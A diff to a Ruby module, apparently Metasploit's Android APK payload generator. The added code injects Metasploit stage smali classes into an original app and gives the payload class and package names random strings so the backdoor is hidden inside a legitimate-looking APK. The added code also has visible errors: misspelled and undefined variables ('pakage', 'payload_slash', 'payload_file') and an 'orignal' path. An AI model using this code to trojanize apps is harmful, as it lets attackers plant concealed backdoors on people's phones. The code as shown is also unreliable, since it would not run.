@@ -188,5 +188,25 @@ class MSF::Payload::Apk
       package = package + ".#{Rex::Text::rand_text_alpha_lower(5)}"
       classes = {}
       classes['Payload'] = Rex::Text::rand_text_alpha_lower(5).capitalize
-       
-            
+    classes['MainService'] = Rex::Text::rand_text_alpha_lower(5).capitalize
+    classes['MainBroadcastReceiver'] = Rex::Text::rand_text_alpha_lower(5).capitalize
+    package_slash = pakage.gsub(/\./, "/")
+    print_status "Adding payload as package #{package}\n"
+    payload_files = Dir.glob("#{tempdir}/payload/smali/com/metasploit/stage/*.smali")
+    payload_dir = "#{tempdir}/orignal/smali/#{payload_slash}/"
+    FileUtils.mkdir_p payload_dir
+
+    payload_file.each do |file_name|
+      smali = File.read(file_name)
+      smali_class = File.basename file_name
+      for oldclass, newclass in classes
+        if smali_class == "#{oldclass}.smali"
+          smali_class = "#{newclass}.smali"
+        end
+        smali.gsub!(/com\/metasploit\/stage\/#{oldclass}/, package_slash + "/" + newclass)
+      end
+      smali.gsub!(/com\/metasploit\/stage/, package_slash)
+      newfilename = "#{payload_dir}#{smali_class}"            
+      File.open(newfilename, "wb") {|file| file.puts smali}
+    end
+    
